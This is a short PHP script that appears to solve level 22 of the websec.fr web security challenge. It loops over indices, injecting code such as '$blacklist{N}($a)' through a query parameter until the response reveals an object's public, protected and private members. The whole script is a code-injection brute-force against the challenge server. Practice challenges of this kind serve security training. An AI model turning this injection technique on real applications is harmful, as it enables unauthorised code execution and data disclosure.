<?php 
$i = 0;
while($found !== true) {

    $resp = file_get_contents("https://websec.fr/level22/index.php?code=\$blacklist{{$i}}(\$a)", false, $context);

    if (strpos($resp, 'pub') !== false && strpos($resp, 'pro') !== false && strpos($resp, 'pri') !== false )
    {
        echo "index: ". $i . " is the one! \n";
        echo $resp;
        $found = true;
    }
    else {
        echo "function: " . $i . " is not good" , "\n";
    }
    usleep(100000);

    $i++;
}
?>